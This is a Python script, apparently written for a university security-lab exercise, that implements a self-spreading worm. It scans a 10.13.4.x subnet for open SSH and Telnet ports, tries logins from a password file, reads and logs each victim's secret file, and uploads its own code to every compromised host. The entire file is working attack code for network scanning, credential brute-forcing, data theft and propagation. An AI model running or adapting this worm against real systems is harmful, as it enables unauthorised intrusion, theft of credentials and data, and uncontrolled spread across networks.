import socket
import paramiko
import telnetlib
import time

def find_vulnerable_machines():
    valid_ssh = [] #open ssh ports
    valid_telnet = [] #open telnet ports
    for i in range(0,256): # go through all IPs in subnet
        currIP = f'10.13.4.{i}'
        for port in [22,23]:
            try:
                s = socket.socket() 
                s.settimeout(1)
                s.connect((currIP, port)) #attempt to connect

                if port == 22: #if successfull
                    valid_ssh.append(currIP)
                elif port == 23: #if successful
                    valid_telnet.append(currIP)

                s.close()
            except:
                s.close() #close connection
                continue
    with open("./open_ssh.log",'a') as f: #save list
        for ssh in valid_ssh:
            f.write(f'{ssh}\n')

    with open("./open_telnet.log",'a') as f: #save list
        for telnet in valid_telnet:
            f.write(f'{telnet}\n')
    return valid_ssh, valid_telnet

def find_vulnerable_accounts(ssharray, telnetarray):
    usernames = []
    passes = []
    ssh_credentials = []
    telnet_credentials = []

    #read user,pass from Q2pwd file
    with open('/home/cse/Lab2/Q2pwd', 'r') as f:
        for line in f:
            user, pwd = line.strip().split()
            usernames.append(user)
            passes.append(pwd)
    #try logging in 
    for ssh in ssharray:
        for i in range(len(usernames)):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try: #use user,pass to login
                client.connect(ssh, port=22, username=usernames[i], password=passes[i], auth_timeout=10)
                client.close()
                ssh_credentials.append((ssh, usernames[i], passes[i]))
            except: #failed, close and continue
                client.close()
                continue
    for tel in telnetarray:
        for j in range(len(usernames)):
            try:
                client = telnetlib.Telnet(tel, 23, timeout=10)
                client.read_until(b"login: ") #waiting for login prompt
                client.write(usernames[j].encode('ascii') + b"\n")
                client.read_until(b"Password: ") #waiting for pass prompt
                client.write(passes[j].encode('ascii') + b"\n")

                shell_prompt = client.read_until(b"$", timeout=10) #look for shell prompt
                if b"$" in shell_prompt or b">" in shell_prompt or b"#" in shell_prompt:
                    client.close()
                    telnet_credentials.append((tel, usernames[j], passes[j]))
                else: #failed, close
                    client.close()
                    continue
            except: #login failed, onto next creds
                continue
    with open("./ssh_accounts.log", 'a') as f:#valid ssh creds
        for s in ssh_credentials:
            f.write(f'{s[0]} {s[1]} {s[2]}\n')
    with open("./telnet_accounts.log", 'a') as f: #valid telnet creds
        for t in telnet_credentials:
            f.write(f'{t[0]} {t[1]} {t[2]}\n')
    return ssh_credentials, telnet_credentials


def extract_and_infect(allVulnerableAccounts):
    for vulSSH in allVulnerableAccounts[0]:
        serv = paramiko.SSHClient()
        serv.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try: #try connecting to ssh with found creds
            serv.connect(f'{vulSSH[0]}', port=22, username=f'{vulSSH[1]}', password=f'{vulSSH[2]}', timeout=10)
            sftp = serv.open_sftp()
            #try secret file
            remFile = sftp.open(f'/home/{vulSSH[1]}/Q2secret')
            content = remFile.read().decode('ascii')
            remFile.close()

            #upload worm
            sftp.put('./Q2worm.py', f'/home/{vulSSH[1]}/Q2worm.py')
            sftp.close()
            serv.close()
        except:
            serv.close()
            continue
        #save locally
        with open('./extracted_secrets.log', 'a') as dest:
            dest.write(content + "\n")

    for vulTEL in allVulnerableAccounts[1]:
        try:
            fileToCopy = open('./Q2worm.py').read() #read worm filw
            telly = telnetlib.Telnet(f'{vulTEL[0]}', 23, timeout=20)

            telly.read_until(b"login: ") #login with found creds
            telly.write(f'{vulTEL[1]}'.encode('ascii') + b"\n")
            telly.read_until(b"Passwords: ")
            telly.write(f'{vulTEL[2]}'.encode('ascii') + b"\n")
            time.sleep(3)
            #read secret file
            telly.read_until(b"$ ")
            telly.write(f'cat /home/{vulTEL[1]}/Q2secret\n'.encode('ascii'))
            content1 = telly.read_until(b"$ ")
            content2 = content1.decode('ascii').split("\n")
            content = content2[-2]
            #upload worm for telnet
            telly.write(f'cd /home/{vulTEL[1]}\n'.encode('ascii'))
            time.sleep(3)
            telly.write(f'cat > Q2worm.py << EOF'.encode('ascii') + b"\n")
            time.sleep(3)
            telly.write(fileToCopy.encode('ascii') + b"\n")
            time.sleep(3)
            telly.write(b'EOF\n')
            time.sleep(3)
            telly.write(f'exit\n'.encode('ascii'))
            telly.close()
        except:
            continue

        with open('./extracted_secrets.log', 'a') as dest:
            dest.write(content + "\n")

if __name__ == '__main__':
    ssh, telnet = find_vulnerable_machines()
    vulnerable_accounts = find_vulnerable_accounts(ssh, telnet)
    extract_and_infect(vulnerable_accounts)
